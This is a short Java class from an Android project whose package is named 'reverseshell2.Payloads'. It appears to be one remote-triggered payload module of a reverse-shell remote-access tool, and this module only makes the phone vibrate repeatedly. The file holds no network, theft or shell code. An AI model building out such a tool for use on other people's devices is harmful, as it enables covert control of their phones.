package com.example.reverseshell2.Payloads;

import android.content.Context;
import android.os.Vibrator;

public class vibrate {

    Context context;

    public vibrate(Context context){
        this.context = context;
    }


    public void vib(int i){
        Vibrator vibrator = (Vibrator) context.getSystemService(context.VIBRATOR_SERVICE);

            for(int k=0;k<i;k++){
                try {
                    vibrator.vibrate(500);
                    Thread.sleep(800);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
    }

}
